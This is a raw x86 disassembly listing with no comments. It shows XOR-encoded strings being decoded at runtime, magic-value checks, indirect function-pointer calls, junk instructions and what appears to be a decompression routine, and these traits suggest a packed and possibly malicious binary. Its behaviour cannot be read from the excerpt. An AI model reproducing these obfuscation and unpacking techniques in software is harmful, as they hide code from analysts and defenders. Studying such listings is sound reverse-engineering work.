  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
  416537:	add    BYTE PTR [eax+eax*2],ah
  41653a:	inc    ebx
  41653b:	add    BYTE PTR [eax],ch
  41653d:	inc    eax
  41653e:	inc    ebx
  41653f:	add    BYTE PTR [eax],al
  416541:	pusha  
  416542:	inc    ebx
  416543:	add    BYTE PTR [eax+eiz*2],al
  416546:	inc    ebx
  416547:	add    BYTE PTR [eax],cl
  416549:	pusha  
  41654a:	inc    ebx
  41654b:	add    BYTE PTR [eax+eiz*2],cl
  41654e:	inc    ebx
  41654f:	add    BYTE PTR [eax],dl
  416551:	pusha  
  416552:	inc    ebx
  416553:	add    BYTE PTR [eax+eiz*2],dl
  416556:	inc    ebx
  416557:	add    BYTE PTR [eax],bl
  416559:	pusha  
  41655a:	inc    ebx
  41655b:	add    BYTE PTR [eax+eiz*2],bl
  41655e:	inc    ebx
  41655f:	add    BYTE PTR [eax],al
  416561:	push   eax
  416562:	inc    ebx
  416563:	add    BYTE PTR [eax+edx*2],al
  416566:	inc    ebx
  416567:	add    BYTE PTR [eax],cl
  416569:	push   eax
  41656a:	inc    ebx
  41656b:	add    BYTE PTR [eax+edx*2],cl
  41656e:	inc    ebx
  41656f:	add    BYTE PTR [eax],dl
  416571:	push   eax
  416572:	inc    ebx
  416573:	add    BYTE PTR [eax+edx*2],dl
  416576:	inc    ebx
  416577:	add    BYTE PTR [eax],bl
  416579:	push   eax
  41657a:	inc    ebx
  41657b:	add    BYTE PTR [eax+edx*2],bl
  41657e:	inc    ebx
  41657f:	add    BYTE PTR [eax],al
  416581:	add    BYTE PTR [eax],al
  416583:	add    al,dl
  416585:	into   
  416586:	xor    BYTE PTR [ebp+0x0],cl
  416589:	add    BYTE PTR [eax],al
  41658b:	add    BYTE PTR [edx],al
  41658d:	add    BYTE PTR [eax],al
  41658f:	add    BYTE PTR ds:0xc0000000,bh
  416595:	add    DWORD PTR gs:[eax],eax
  416598:	rcr    BYTE PTR [ecx+0x1],0x0
  41659c:	add    BYTE PTR [eax+0x43],dh
  41659f:	add    BYTE PTR [eax+esi*2],al
  4165a2:	inc    ebx
  4165a3:	add    BYTE PTR [eax],cl
  4165a5:	jo     0x4165ea
  4165a7:	add    BYTE PTR [eax+esi*2],cl
  4165aa:	inc    ebx
  4165ab:	add    BYTE PTR [eax],dl
  4165ad:	jo     0x4165f2
  4165af:	add    BYTE PTR [eax+esi*2],dl
  4165b2:	inc    ebx
  4165b3:	add    BYTE PTR [eax],bl
  4165b5:	jo     0x4165fa
  4165b7:	add    BYTE PTR [eax+esi*2],bl
  4165ba:	inc    ebx
  4165bb:	add    BYTE PTR [eax],al
  4165bd:	add    BYTE PTR [eax],al
  4165bf:	add    BYTE PTR [edx+0x53],dl
  4165c2:	inc    esp
  4165c3:	push   ebx
  4165c4:	push   ecx
  4165c5:	sbb    cl,bh
  4165c7:	cmp    eax,0x42f653e9
  4165cc:	lods   eax,DWORD PTR ds:[esi]
  4165cd:	mov    eax,0x73b3908f
  4165d2:	add    dl,al
  4165d4:	add    DWORD PTR [eax],eax
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	inc    ebx
  4165d9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  4165dd:	jb     0x416651
  4165df:	outs   dx,BYTE PTR gs:[esi]
  4165e1:	je     0x416627
  4165e3:	popa   
  4165e4:	je     0x416647
  4165e6:	pop    esp
  4165e7:	dec    ebp
  4165e8:	outs   dx,DWORD PTR ds:[esi]
  4165e9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  4165f1:	ins    BYTE PTR es:[edi],dx
  4165f2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4165f9:	dec    esi
  4165fa:	gs ja  0x4165fd
  4165fd:	mov    edx,DWORD PTR [ebp-0x14]
  416600:	sub    esp,0x108
  416606:	push   ebx
  416607:	mov    eax,ebx
  416609:	xchg   ecx,eax
  41660a:	mov    eax,DWORD PTR [ebp+0x8]
  41660d:	cmp    eax,0xf89c8585
  416612:	jne    0x416a95
  416618:	mov    eax,DWORD PTR [ebp+0xc]
  41661b:	cmp    eax,0xf89c8584
  416620:	jne    0x416a95
  416626:	mov    eax,DWORD PTR [ebp+0x24]
  416629:	mov    DWORD PTR [ebp-0x4],eax
  41662c:	mov    BYTE PTR [ebp-0x18],0x1b
  416630:	mov    BYTE PTR [ebp-0x17],0x18
  416634:	mov    BYTE PTR [ebp-0x16],0x5
  416638:	mov    BYTE PTR [ebp-0x15],0x4f
  41663c:	mov    BYTE PTR [ebp-0x14],0x4e
  416640:	mov    BYTE PTR [ebp-0x13],0x7c
  416644:	mov    BYTE PTR [ebp-0x20],0x9
  416648:	mov    BYTE PTR [ebp-0x1f],0xf
  41664c:	mov    BYTE PTR [ebp-0x1e],0x19
  416650:	mov    BYTE PTR [ebp-0x1d],0xe
  416654:	mov    BYTE PTR [ebp-0x1c],0x4f
  416658:	mov    BYTE PTR [ebp-0x1b],0x4e
  41665c:	mov    BYTE PTR [ebp-0x1a],0x7c
  416660:	mov    BYTE PTR [ebp-0x28],0xf
  416664:	mov    BYTE PTR [ebp-0x27],0x4
  416668:	mov    BYTE PTR [ebp-0x26],0x0
  41666c:	mov    BYTE PTR [ebp-0x25],0xb
  416670:	mov    BYTE PTR [ebp-0x24],0x1d
  416674:	mov    BYTE PTR [ebp-0x23],0xc
  416678:	push   esi
  416679:	mov    BYTE PTR [ebp-0x22],0x5
  41667d:	mov    BYTE PTR [ebp-0x21],0x7c
  416681:	xor    esi,esi
  416683:	mov    eax,0xf8
  416688:	lea    ecx,[ebp+esi*1-0x18]
  41668c:	movzx  edx,BYTE PTR [ecx]
  41668f:	xor    edx,0x74
  416692:	add    edx,eax
  416694:	inc    esi
  416695:	mov    BYTE PTR [ecx],dl
  416697:	cmp    esi,0x6
  41669a:	jb     0x416688
  41669c:	xor    esi,esi
  41669e:	lea    ecx,[ebp+esi*1-0x20]
  4166a2:	movzx  edx,BYTE PTR [ecx]
  4166a5:	xor    edx,0x74
  4166a8:	add    edx,eax
  4166aa:	inc    esi
  4166ab:	mov    BYTE PTR [ecx],dl
  4166ad:	cmp    esi,0x7
  4166b0:	jb     0x41669e
  4166b2:	xor    esi,esi
  4166b4:	lea    ecx,[ebp+esi*1-0x28]
  4166b8:	movzx  edx,BYTE PTR [ecx]
  4166bb:	xor    edx,0x74
  4166be:	add    edx,eax
  4166c0:	inc    esi
  4166c1:	mov    BYTE PTR [ecx],dl
  4166c3:	cmp    esi,0x8
  4166c6:	jb     0x4166b4
  4166c8:	lea    eax,[ebp-0x2c]
  4166cb:	mov    DWORD PTR [ebp-0x8],eax
  4166ce:	mov    ecx,DWORD PTR [ebp-0x8]
  4166d1:	mov    eax,0x7113fcef
  4166d6:	mov    DWORD PTR [ecx],eax
  4166d8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4166db:	push   edi
  4166dc:	mov    esi,0x4e22
  4166e1:	mov    ebx,0x3272e2
  4166e6:	cmp    ecx,eax
  4166e8:	jne    0x4167b3
  4166ee:	lea    eax,[esi+0x53]
  4166f1:	mov    WORD PTR [ebp-0x78],ax
  4166f5:	mov    eax,esi
  4166f7:	mov    WORD PTR [ebp-0x76],ax
  4166fb:	add    eax,0x5d
  4166fe:	mov    WORD PTR [ebp-0x74],ax
  416702:	lea    eax,[esi+0x1a]
  416705:	mov    WORD PTR [ebp-0x72],ax
  416709:	add    eax,0x41
  41670c:	mov    ecx,eax
  41670e:	lea    eax,[esi+0x15]
  416711:	mov    WORD PTR [ebp-0x66],ax
  416715:	mov    eax,esi
  416717:	mov    WORD PTR [ebp-0x64],ax
  41671b:	add    eax,0x14
  41671e:	mov    WORD PTR [ebp-0x62],ax
  416722:	mov    eax,0x469
  416727:	mov    WORD PTR [ebp-0x60],ax
  41672b:	mov    eax,0x5678
  416730:	mov    WORD PTR [ebp-0x5e],ax
  416734:	mov    eax,0x6118
  416739:	mov    WORD PTR [ebp-0x5c],ax
  41673d:	lea    eax,[ebp-0xe0]
  416743:	push   eax
  416744:	mov    eax,DWORD PTR [ebp+0xc]
  416747:	mov    edi,0x751089b
  41674c:	xor    eax,edi
  41674e:	add    eax,ebx
  416750:	push   eax
  416751:	mov    WORD PTR [ebp-0x70],cx
  416755:	lea    ecx,[esi+0x16]
  416758:	mov    edx,ecx
  41675a:	lea    eax,[ebp-0x78]
  41675d:	push   eax
  41675e:	mov    eax,DWORD PTR [ebp-0x4]
  416761:	mov    eax,DWORD PTR [eax+0x198]
  416767:	mov    WORD PTR [ebp-0x6e],dx
  41676b:	mov    edx,0x4f96
  416770:	mov    WORD PTR [ebp-0x6c],dx
  416774:	mov    DWORD PTR [ebp-0x6a],0x4e7d4e3b
  41677b:	mov    DWORD PTR [ebp-0x5a],0x4e38f10a
  416782:	mov    DWORD PTR [ebp-0xe0],0x1
  41678c:	mov    DWORD PTR [ebp-0xdc],0x255
  416796:	push   DWORD PTR [eax]
  416798:	mov    eax,DWORD PTR [ebp+0x10]
  41679b:	call   eax
  41679d:	mov    DWORD PTR [ebp-0x8],eax
  4167a0:	mov    eax,DWORD PTR [ebp-0x8]
  4167a3:	test   eax,eax
  4167a5:	je     0x4167b8
  4167a7:	xor    DWORD PTR ds:0x76586876,0x87687666
  4167b1:	jmp    0x4167b8
  4167b3:	mov    edi,0x751089b
  4167b8:	mov    eax,DWORD PTR [ebp-0x4]
  4167bb:	mov    ecx,DWORD PTR [eax+0x18c]
  4167c1:	xor    eax,eax
  4167c3:	cmp    DWORD PTR [ecx],eax
  4167c5:	jne    0x416a30
  4167cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4167ce:	mov    ecx,DWORD PTR [ecx+0x17c]
  4167d4:	mov    DWORD PTR [ecx],eax
  4167d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4167d9:	mov    ecx,DWORD PTR [ecx+0x180]
  4167df:	mov    DWORD PTR [ecx],eax
  4167e1:	mov    eax,0x4f8f
  4167e6:	mov    WORD PTR [ebp-0x9c],ax
  4167ed:	mov    eax,esi
  4167ef:	mov    WORD PTR [ebp-0x9a],ax
  4167f6:	mov    eax,0x4e7f
  4167fb:	mov    WORD PTR [ebp-0x98],ax
  416802:	add    eax,0xffffffc0
  416805:	mov    WORD PTR [ebp-0x96],ax
  41680c:	mov    eax,0x4f92
  416811:	mov    WORD PTR [ebp-0x94],ax
  416818:	mov    eax,0x4e3e
  41681d:	mov    WORD PTR [ebp-0x92],ax
  416824:	add    eax,0x3f
  416827:	mov    WORD PTR [ebp-0x90],ax
  41682e:	mov    eax,0x4e38
  416833:	mov    WORD PTR [ebp-0x8e],ax
  41683a:	mov    eax,esi
  41683c:	mov    WORD PTR [ebp-0x8c],ax
  416843:	mov    eax,0x4e3b
  416848:	mov    WORD PTR [ebp-0x8a],ax
  41684f:	mov    eax,0x99ff
  416854:	mov    WORD PTR [ebp-0x88],ax
  41685b:	mov    eax,0x828e
  416860:	mov    WORD PTR [ebp-0x86],ax
  416867:	mov    eax,0xd78d
  41686c:	mov    WORD PTR [ebp-0x84],ax
  416873:	add    eax,0x1c
  416876:	mov    WORD PTR [ebp-0x82],ax
  41687d:	mov    eax,0x27a8
  416882:	mov    WORD PTR [ebp-0x80],ax
  416886:	mov    eax,0x47a8
  41688b:	mov    WORD PTR [ebp-0x7e],ax
  41688f:	mov    eax,0x4e39
  416894:	push   0x8
  416896:	mov    WORD PTR [ebp-0x7c],ax
  41689a:	mov    DWORD PTR [ebp-0x10],0xb00040f
  4168a1:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  4168a8:	lea    eax,[ebp-0x10]
  4168ab:	pop    ecx
  4168ac:	mov    dl,BYTE PTR [eax]
  4168ae:	xor    dl,0x74
  4168b1:	sub    dl,0x8
  4168b4:	mov    BYTE PTR [eax],dl
  4168b6:	inc    eax
  4168b7:	dec    ecx
  4168b8:	jne    0x4168ac
  4168ba:	lea    eax,[ebp-0x10]
  4168bd:	mov    DWORD PTR [ebp-0xdc],eax
  4168c3:	lea    eax,[ebp-0xe0]
  4168c9:	push   eax
  4168ca:	mov    eax,DWORD PTR [ebp+0xc]
  4168cd:	xor    eax,edi
  4168cf:	add    eax,ebx
  4168d1:	push   eax
  4168d2:	mov    eax,DWORD PTR [ebp-0x4]
  4168d5:	add    eax,0x66
  4168d8:	push   eax
  4168d9:	mov    eax,DWORD PTR [ebp-0x4]
  4168dc:	mov    eax,DWORD PTR [eax+0x198]
  4168e2:	mov    DWORD PTR [ebp-0xe0],0x1
  4168ec:	push   DWORD PTR [eax]
  4168ee:	mov    eax,DWORD PTR [ebp+0x10]
  4168f1:	call   eax
  4168f3:	mov    ecx,DWORD PTR [ebp+0x8]
  4168f6:	xor    ecx,edi
  4168f8:	add    ecx,ebx
  4168fa:	mov    DWORD PTR [ebp-0x8],eax
  4168fd:	cmp    eax,ecx
  4168ff:	jne    0x41691a
  416901:	mov    eax,ds:0x33730bee
  416906:	or     eax,0x22150bef
  41690b:	mov    ds:0x33730bee,eax
  416910:	add    eax,0x3372e90f
  416915:	mov    ds:0x33730bee,eax
  41691a:	mov    ecx,0x4f8a
  41691f:	mov    eax,ecx
  416921:	mov    WORD PTR [ebp-0x40],ax
  416925:	mov    eax,0x4e71
  41692a:	mov    edx,eax
  41692c:	mov    WORD PTR [ebp-0x3e],dx
  416930:	lea    edx,[ecx+0xf]
  416933:	mov    WORD PTR [ebp-0x3c],dx
  416937:	add    edx,0xfffffff8
  41693a:	mov    WORD PTR [ebp-0x3a],dx
  41693e:	lea    edx,[ecx+0x9]
  416941:	mov    WORD PTR [ebp-0x38],dx
  416945:	add    edx,0x19
  416948:	mov    WORD PTR [ebp-0x36],dx
  41694c:	lea    edx,[ecx+0x1b]
  41694f:	mov    WORD PTR [ebp-0x34],dx
  416953:	mov    WORD PTR [ebp-0x32],cx
  416957:	mov    ecx,esi
  416959:	mov    WORD PTR [ebp-0x30],cx
  41695d:	lea    ecx,[edx+0x5]
  416960:	mov    edx,ecx
  416962:	mov    WORD PTR [ebp-0x54],dx
  416966:	mov    edx,eax
  416968:	mov    WORD PTR [ebp-0x52],dx
  41696c:	add    edx,0x8
  41696f:	mov    WORD PTR [ebp-0x50],dx
  416973:	mov    WORD PTR [ebp-0x4e],ax
  416977:	add    eax,0x2
  41697a:	mov    WORD PTR [ebp-0x4c],ax
  41697e:	lea    eax,[ecx-0x1e]
  416981:	mov    WORD PTR [ebp-0x4a],ax
  416985:	add    eax,0xfffffff9
  416988:	mov    WORD PTR [ebp-0x48],ax
  41698c:	mov    WORD PTR [ebp-0x46],cx
  416990:	mov    WORD PTR [ebp-0x44],si
  416994:	mov    eax,DWORD PTR [ebp+0x8]
  416997:	movzx  ecx,WORD PTR [ebp-0x54]
  41699b:	xor    eax,edi
  41699d:	add    eax,ebx
  41699f:	xor    eax,ecx
  4169a1:	mov    WORD PTR [ebp-0x54],ax
  4169a5:	mov    eax,DWORD PTR [ebp+0x8]
  4169a8:	movzx  ecx,WORD PTR [ebp-0x40]
  4169ac:	xor    eax,edi
  4169ae:	add    eax,ebx
  4169b0:	xor    eax,ecx
  4169b2:	mov    WORD PTR [ebp-0x40],ax
  4169b6:	xor    eax,eax
  4169b8:	mov    WORD PTR [ebp-0xf4],ax
  4169bf:	mov    WORD PTR [ebp-0x108],ax
  4169c6:	mov    edi,DWORD PTR [ebp+0x24]
  4169c9:	lea    eax,[ebp-0xf4]
  4169cf:	lea    edx,[ebp-0x54]
  4169d2:	mov    DWORD PTR [ebp-0xe0],0x2
  4169dc:	mov    DWORD PTR [ebp-0xdc],eax
  4169e2:	call   0x419373
  4169e7:	mov    DWORD PTR [ebp-0xd8],eax
  4169ed:	lea    eax,[ebp-0xe0]
  4169f3:	push   eax
  4169f4:	mov    eax,DWORD PTR [ebp+0xc]
  4169f7:	xor    eax,0x751089b
  4169fc:	add    eax,ebx
  4169fe:	push   eax
  4169ff:	lea    eax,[ebp-0x9c]
  416a05:	push   eax
  416a06:	push   DWORD PTR [ebp-0x8]
  416a09:	mov    eax,DWORD PTR [ebp+0x10]
  416a0c:	call   eax
  416a0e:	mov    edi,DWORD PTR [ebp+0x24]
  416a11:	lea    eax,[ebp-0x108]
  416a17:	lea    edx,[ebp-0x40]
  416a1a:	mov    DWORD PTR [ebp-0xdc],eax
  416a20:	call   0x419373
  416a25:	mov    DWORD PTR [ebp-0xd8],eax
  416a2b:	mov    edi,0x751089b
  416a30:	mov    eax,DWORD PTR [ebp+0x14]
  416a33:	push   DWORD PTR [ebp-0x4]
  416a36:	push   DWORD PTR [ebp+0x20]
  416a39:	push   DWORD PTR [ebp+0x1c]
  416a3c:	push   DWORD PTR [ebp+0x18]
  416a3f:	push   DWORD PTR [ebp+0x10]
  416a42:	push   DWORD PTR [ebp+0x8]
  416a45:	push   DWORD PTR [ebp+0xc]
  416a48:	call   0x417bef
  416a4d:	test   eax,eax
  416a4f:	je     0x416a93
  416a51:	add    DWORD PTR [ebp-0x4],eax
  416a54:	push   DWORD PTR [ebp-0x4]
  416a57:	lea    esi,[ebp+0x4]
  416a5a:	call   0x416e83
  416a5f:	mov    eax,DWORD PTR [ebp-0x4]
  416a62:	mov    eax,DWORD PTR [eax+0x1c8]
  416a68:	mov    eax,DWORD PTR [eax]
  416a6a:	xor    eax,edi
  416a6c:	add    eax,ebx
  416a6e:	mov    eax,DWORD PTR [ebp-0x4]
  416a71:	jne    0x416a89
  416a73:	mov    ecx,DWORD PTR [ebp-0x4]
  416a76:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416a7c:	push   DWORD PTR [ecx]
  416a7e:	mov    eax,DWORD PTR [eax+0x1d8]
  416a84:	call   DWORD PTR [eax+0x28]
  416a87:	jmp    0x416a93
  416a89:	mov    eax,DWORD PTR [eax+0x17c]
  416a8f:	mov    eax,DWORD PTR [eax]
  416a91:	add    DWORD PTR [esi],eax
  416a93:	pop    edi
  416a94:	pop    esi
  416a95:	pop    ebx
  416a96:	leave  
  416a97:	ret    0x20
  416a9a:	push   edi
  416a9b:	push   esi
  416a9c:	push   ebx
  416a9d:	push   ebp
  416a9e:	mov    ebp,esp
  416aa0:	mov    eax,DWORD PTR [ebp+0x24]
  416aa3:	add    DWORD PTR [ebp+0x28],eax
  416aa6:	push   eax
  416aa7:	cld    
  416aa8:	mov    esi,DWORD PTR [ebp+0x18]
  416aab:	add    DWORD PTR [ebp+0x1c],esi
  416aae:	push   esi
  416aaf:	mov    esi,DWORD PTR [ebp+0x14]
  416ab2:	lods   eax,DWORD PTR ds:[esi]
  416ab3:	xchg   edx,eax
  416ab4:	push   edx
  416ab5:	mov    cl,BYTE PTR [esi-0x2]
  416ab8:	or     eax,0xffffffff
  416abb:	shl    eax,cl
  416abd:	not    eax
  416abf:	push   eax
  416ac0:	mov    cl,dh
  416ac2:	or     eax,0xffffffff
  416ac5:	shl    eax,cl
  416ac7:	not    eax
  416ac9:	push   eax
  416aca:	add    cl,dl
  416acc:	mov    edi,esi
  416ace:	sub    esp,0xc
  416ad1:	sub    eax,eax
  416ad3:	inc    eax
  416ad4:	push   eax
  416ad5:	push   eax
  416ad6:	push   eax
  416ad7:	push   eax
  416ad8:	push   eax
  416ad9:	push   edi
  416ada:	sub    esi,esi
  416adc:	push   esi
  416add:	or     ebx,0xffffffff
  416ae0:	mov    eax,0x300
  416ae5:	shl    eax,cl
  416ae7:	lea    ecx,[eax+0x736]
  416aed:	mov    eax,0x4000400
  416af2:	shr    ecx,1
  416af4:	rep stos DWORD PTR es:[edi],eax
  416af6:	push   0x5
  416af8:	pop    ecx
  416af9:	call   0x416de4
  416afe:	loop   0x416af9
  416b00:	lea    esi,[esi]
  416b02:	lea    edi,[edi]
  416b04:	mov    edi,DWORD PTR [ebp-0x4]
  416b07:	mov    eax,DWORD PTR [ebp-0x10]
  416b0a:	sub    edi,DWORD PTR [ebp+0x24]
  416b0d:	and    eax,edi
  416b0f:	mov    DWORD PTR [ebp-0x18],eax
  416b12:	mov    al,0x0
  416b14:	call   0x416dfc
  416b19:	jne    0x416bb4
  416b1f:	mov    cl,BYTE PTR [ebp-0xc]
  416b22:	and    edi,DWORD PTR [ebp-0x14]
  416b25:	shl    edi,cl
  416b27:	sub    cl,0x8
  416b2a:	neg    cl
  416b2c:	shr    esi,cl
  416b2e:	pop    eax
  416b2f:	add    edi,esi
  416b31:	pop    esi
  416b32:	lea    edi,[edi+edi*2]
  416b35:	shl    edi,0x8
  416b38:	cmp    al,0x7
  416b3a:	pop    edx
  416b3b:	lea    ecx,[esi+edi*2+0xe6c]
  416b42:	push   ecx
  416b43:	push   esi
  416b44:	mov    esi,0x100
  416b49:	push   eax
  416b4a:	mov    al,0x1
  416b4c:	jb     0x416b82
  416b4e:	mov    edi,DWORD PTR [ebp-0x4]
  416b51:	sub    edi,DWORD PTR [ebp-0x24]
  416b54:	movzx  edi,BYTE PTR [edi]
  416b57:	mov    ebp,DWORD PTR [ebp-0x34]
  416b5a:	shl    edi,1
  416b5c:	mov    ecx,esi
  416b5e:	and    esi,edi
  416b60:	add    ecx,esi
  416b62:	lea    ebp,[ebp+ecx*2+0x0]
  416b66:	call   0x416e1b
  416b6b:	mov    ecx,eax
  416b6d:	shr    esi,0x8
  416b70:	and    ecx,0x1
  416b73:	cmp    esi,ecx
  416b75:	mov    esi,0x100
  416b7a:	jne    0x416b8a
  416b7c:	cmp    eax,esi
  416b7e:	jb     0x416b57
  416b80:	jmp    0x416b96
  416b82:	mov    ebp,DWORD PTR [ebp-0x34]
  416b85:	call   0x416e1b
  416b8a:	inc    eax
  416b8b:	inc    esi
  416b8c:	sub    eax,0x1
  416b8f:	sub    esi,0x1
  416b92:	cmp    eax,esi
  416b94:	jb     0x416b82
  416b96:	pop    edx
  416b97:	inc    edx
  416b98:	cmp    edx,0x5
  416b9b:	dec    edx
  416b9c:	mov    ecx,edx
  416b9e:	jb     0x416baf
  416ba0:	inc    edx
  416ba1:	cmp    edx,0xb
  416ba4:	dec    edx
  416ba5:	mov    cl,0x4
  416ba7:	dec    cl
  416ba9:	jb     0x416baf
  416bab:	mov    cl,0x7
  416bad:	dec    cl
  416baf:	sub    edx,ecx
  416bb1:	push   edx
  416bb2:	jmp    0x416c03
  416bb4:	mov    al,0xc1
  416bb6:	dec    al
  416bb8:	call   0x416e0c
  416bbd:	jne    0x416bd3
  416bbf:	pop    eax
  416bc0:	pop    edi
  416bc1:	pop    edx
  416bc2:	pop    ecx
  416bc3:	pop    edx
  416bc4:	pop    ecx
  416bc5:	push   DWORD PTR [esp]
  416bc8:	push   ecx
  416bc9:	push   edx
  416bca:	mov    edx,0x664
  416bcf:	mov    cl,0x0
  416bd1:	jmp    0x416c46
  416bd3:	mov    al,0xcd
  416bd5:	dec    al
  416bd7:	call   0x416e0c
  416bdc:	jne    0x416c0c
  416bde:	mov    al,0xf1
  416be0:	dec    al
  416be2:	call   0x416dfc
  416be7:	jne    0x416c3c
  416be9:	pop    eax
  416bea:	cmp    al,0x7
  416bec:	mov    al,0x9
  416bee:	jb     0x416bf2
  416bf0:	mov    al,0xb
  416bf2:	push   eax
  416bf3:	mov    esi,DWORD PTR [ebp-0x4]
  416bf6:	sub    esi,DWORD PTR [ebp-0x24]
  416bf9:	cmp    esi,DWORD PTR [ebp+0x24]
  416bfc:	jb     0x416dd3
  416c02:	lods   al,BYTE PTR ds:[esi]
  416c03:	mov    edi,DWORD PTR [ebp-0x4]
  416c06:	stos   BYTE PTR es:[edi],al
  416c07:	jmp    0x416d9a
  416c0c:	mov    al,0xd8
  416c0e:	call   0x416e0c
  416c13:	mov    esi,DWORD PTR [ebp-0x28]
  416c16:	je     0x416c33
  416c18:	mov    al,0xe4
  416c1a:	call   0x416e0c
  416c1f:	mov    esi,DWORD PTR [ebp-0x2c]
  416c22:	je     0x416c2d
  416c24:	mov    esi,DWORD PTR [ebp-0x30]
  416c27:	mov    ecx,DWORD PTR [ebp-0x2c]
  416c2a:	mov    DWORD PTR [ebp-0x30],ecx
  416c2d:	mov    ecx,DWORD PTR [ebp-0x28]
  416c30:	mov    DWORD PTR [ebp-0x2c],ecx
  416c33:	mov    ecx,DWORD PTR [ebp-0x24]
  416c36:	mov    DWORD PTR [ebp-0x28],ecx
  416c39:	mov    DWORD PTR [ebp-0x24],esi
  416c3c:	pop    eax
  416c3d:	pop    edi
  416c3e:	pop    ecx
  416c3f:	mov    edx,0xa68
  416c44:	mov    cl,0x8
  416c46:	add    edx,edi
  416c48:	push   edx
  416c49:	push   edi
  416c4a:	cmp    al,0x7
  416c4c:	mov    al,cl
  416c4e:	jb     0x416c52
  416c50:	add    al,0x3
  416c52:	push   eax
  416c53:	mov    ebp,DWORD PTR [ebp-0x34]
  416c56:	call   0x416e19
  416c5b:	jne    0x416c71
  416c5d:	mov    eax,DWORD PTR [ebp-0x18]
  416c60:	mov    edi,DWORD PTR [ebp-0x34]
  416c63:	shl    eax,0x3
  416c66:	sub    ecx,ecx
  416c68:	push   0x8
  416c6a:	pop    esi
  416c6b:	lea    edi,[edi+eax*2+0x4]
  416c6f:	jmp    0x416ca6
  416c71:	mov    ebp,DWORD PTR [ebp-0x34]
  416c74:	add    ebp,0x2
  416c77:	call   0x416e19
  416c7c:	jne    0x416c96
  416c7e:	mov    eax,DWORD PTR [ebp-0x18]
  416c81:	mov    edi,DWORD PTR [ebp-0x34]
  416c84:	shl    eax,0x3
  416c87:	push   0x8
  416c89:	pop    ecx
  416c8a:	push   0x8
  416c8c:	pop    esi
  416c8d:	lea    edi,[edi+eax*2+0x104]
  416c94:	jmp    0x416ca6
  416c96:	mov    edi,0x204
  416c9b:	add    edi,DWORD PTR [ebp-0x34]
  416c9e:	push   0x10
  416ca0:	pop    ecx
  416ca1:	mov    esi,0x100
  416ca6:	mov    DWORD PTR [ebp-0x1c],ecx
  416ca9:	sub    eax,eax
  416cab:	inc    eax
  416cac:	mov    ebp,edi
  416cae:	call   0x416e1b
  416cb3:	mov    ecx,eax
  416cb5:	sub    ecx,esi
  416cb7:	jb     0x416cac
  416cb9:	add    DWORD PTR [ebp-0x1c],ecx
  416cbc:	cmp    DWORD PTR [ebp-0x3c],0x4
  416cc0:	jae    0x416d76
  416cc6:	add    DWORD PTR [ebp-0x3c],0x7
  416cca:	mov    ecx,DWORD PTR [ebp-0x1c]
  416ccd:	cmp    ecx,0x4
  416cd0:	jb     0x416cd5
  416cd2:	push   0x3
  416cd4:	pop    ecx
  416cd5:	mov    edi,DWORD PTR [ebp-0x38]
  416cd8:	shl    ecx,0x6
  416cdb:	sub    eax,eax
  416cdd:	inc    eax
  416cde:	push   0x40
  416ce0:	pop    esi
  416ce1:	lea    edi,[edi+ecx*2+0x360]
  416ce8:	mov    ebp,edi
  416cea:	call   0x416e1b
  416cef:	mov    ecx,eax
  416cf1:	sub    ecx,esi
  416cf3:	jb     0x416ce8
  416cf5:	mov    DWORD PTR [ebp-0x18],ecx
  416cf8:	mov    DWORD PTR [ebp-0x24],ecx
  416cfb:	cmp    ecx,0x4
  416cfe:	jb     0x416d73
  416d00:	mov    esi,ecx
  416d02:	and    DWORD PTR [ebp-0x24],0x1
  416d06:	shr    esi,1
  416d08:	or     DWORD PTR [ebp-0x24],0x2
  416d0c:	dec    esi
  416d0d:	cmp    ecx,0xe
  416d10:	jae    0x416d2b
  416d12:	mov    eax,0x2af
  416d17:	sub    eax,ecx
  416d19:	mov    ecx,esi
  416d1b:	shl    BYTE PTR [ebp-0x24],cl
  416d1e:	add    eax,DWORD PTR [ebp-0x24]
  416d21:	shl    eax,1
  416d23:	add    eax,DWORD PTR [ebp-0x38]
  416d26:	mov    DWORD PTR [ebp-0x34],eax
  416d29:	jmp    0x416d58
  416d2b:	sub    esi,0x4
  416d2e:	call   0x416dd8
  416d33:	shr    ebx,1
  416d35:	shl    DWORD PTR [ebp-0x24],1
  416d38:	cmp    DWORD PTR [ebp-0x20],ebx
  416d3b:	jb     0x416d43
  416d3d:	inc    DWORD PTR [ebp-0x24]
  416d40:	sub    DWORD PTR [ebp-0x20],ebx
  416d43:	dec    esi
  416d44:	jne    0x416d2e
  416d46:	mov    eax,0x644
  416d4b:	add    eax,DWORD PTR [ebp-0x38]
  416d4e:	mov    DWORD PTR [ebp-0x34],eax
  416d51:	shl    DWORD PTR [ebp-0x24],0x4
  416d55:	push   0x4
